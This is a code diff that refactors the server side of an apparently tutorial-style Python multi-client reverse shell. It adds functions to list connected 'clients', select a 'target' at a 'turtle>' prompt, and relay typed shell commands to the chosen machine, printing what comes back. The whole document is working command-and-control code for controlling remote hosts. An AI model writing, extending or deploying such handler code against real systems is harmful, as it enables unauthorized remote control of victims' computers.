@@ -37,8 +37,7 @@ def socket_bind():
 
 
 # Replaces socket_accept()
-def reset_connections():
-    print("Calling reset_connections()")
+def accept_connections():
     for c in all_connections:
         c.close()
     del all_connections[:]
@@ -49,40 +48,58 @@ def reset_connections():
             conn.setblocking(1)
             all_connections.append(conn)
             all_addresses.append(address)
-            print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
+            print('\nConnection has been established: ' + address[0])
         except socket.error as msg:
             print("Reset connections error: " + str(msg))
 
 
+# List connections
+def display_connections():
+    if len(all_addresses) > 0:
+        print('----- Clients -----')
+        for address in all_addresses:
+            print(str(all_addresses.index(address) + 1) + '   ' + str(address[0]) + '   ' + str(address[1]))
+        print('')
+    else:
+        print('No clients connected')
+
+
+# Select a target
+def get_target(cmd):
+    try:
+        target = cmd.replace('select ', '')
+        target = int(target) - 1
+        conn = all_connections[target]
+        print("You are now connected to " + str(all_addresses[target][0]))
+        print(str(all_addresses[target][0]) + '> ', end="")
+        return conn
+    except:
+        print('Not a valid selection')
+        return None
+
+
 # Replaces send_commands(conn)
 def interact():
-    print("Calling interact()")
     while True:
-        cmd = input('> ')
+        cmd = input('turtle> ')
         if cmd == 'list':
-            print('----- Clients -----')
-            for address in all_addresses:
-                print(str(all_addresses.index(address) + 1) + '   ' + str(address[0]) + '   ' + str(address[1]))
-            print('')
+            display_connections()
             continue
         if 'select' in cmd:
-            target = cmd.replace('select ', '')
-            target = int(target) - 1
-            conn = all_connections[target]
-            print("You are now connected to " + str(all_addresses[target][0]))
-            print(str(all_addresses[target][0]) + '> ', end="")
-            while True:
-                try:
-                    cmd = input()
-                    if cmd == 'quit':
+            conn = get_target(cmd)
+            if conn is not None:
+                while True:
+                    try:
+                        cmd = input()
+                        if cmd == 'quit':
+                            break
+                        if len(str.encode(cmd)) > 0:
+                            conn.send(str.encode(cmd))
+                            client_response = str(conn.recv(1024), "utf-8")
+                            print(client_response, end="")
+                    except:
+                        print("Connection was lost")
                         break
-                    if len(str.encode(cmd)) > 0:
-                        conn.send(str.encode(cmd))
-                        client_response = str(conn.recv(1024), "utf-8")
-                        print(client_response, end="")
-                except:
-                    print("Connection was lost")
-                    break
 
 
 # Create worker threads (will die when main exits)
@@ -100,7 +117,7 @@ def work():
         if x == 1:
             socket_create()
             socket_bind()
-            reset_connections()
+            accept_connections()
         if x == 2:
             interact()
         queue.task_done()
